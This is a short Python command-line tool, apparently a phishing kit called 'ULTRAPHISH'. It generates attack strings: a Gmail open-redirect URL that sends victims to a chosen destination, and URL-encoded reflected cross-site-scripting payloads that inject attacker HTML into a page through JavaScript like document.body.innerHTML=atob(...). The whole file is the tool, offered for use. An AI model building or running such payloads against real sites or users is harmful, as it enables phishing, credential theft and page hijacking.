from argument_manager import parser
from argument_manager.parser import ParameterError, ActionError
import sys
import xssutils

print (""" _   _ _    ___________  ___ ______ _   _ _____ _____ _   _ 
| | | | |  |_   _| ___ \/ _ \| ___ \ | | |_   _/  ___| | | |
| | | | |    | | | |_/ / /_\ \ |_/ / |_| | | | \ `--.| |_| |
| | | | |    | | |    /|  _  |  __/|  _  | | |  `--. \  _  |
| |_| | |____| | | |\ \| | | | |   | | | |_| |_/\__/ / | | |
 \___/\_____/\_/ \_| \_\_| |_|_|   \_| |_/\___/\____/\_| |_/
                                                            
                                                            """)


def gmail_redirect(values):
    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" %  xssutils.url_encode_all_chars(values.get_dest()))

def encode_xss(values):
    html = values.get_html();
    if html[0] == '@':
        html = xssutils.read_file(html[1:])
    html = xssutils.minify_html(html)
    if(values.get_base64() == '1'):
        html = xssutils.base64_encode_string(html)
    print(xssutils.url_encode_all_chars(values.get_js() % html))

argManager = parser.get_manager()\
    .add_value('--dest', metavar='Destination URL (for gmail)', nargs=1)\
    .add_value('--html', metavar='html to use, prefix with @ to make it a file e.g. --html @file.html', nargs=1)\
    .add_value('--base64', metavar="Base64 encode html payloads, usage --base64 0 for off, default is 1", nargs=1, default='1')\
    .add_value('--js', metavar="Javascript to inject html into (optional), use %s to show lockation to inkect e.g. 'document.body.innerHTML=atob(\"%s\")", nargs=1, default="%s")

argManager.add_action(argManager.print_help, '--help', help='Show this message', action='store_true')\
    .add_action(gmail_redirect, '--gmail', help='Redirect vial mail.google.com', action='store_true')\
    .add_action(encode_xss, '--xss', help="Create reflected xss string", action="store_true")

try:
    if len(sys.argv) > 1:
        argManager.exec()
    else:
        argManager.print_help()

except (ParameterError) as e:
    if argManager.get_current_action() is None:
        print('Input parameter Error: "%s"' % e)
    else:
        print('Input parameter Error: "%s" while executing the %s command: ' % e, argManager.get_current_action())

except ActionError as e:
    print("Action Error: " +  str(e))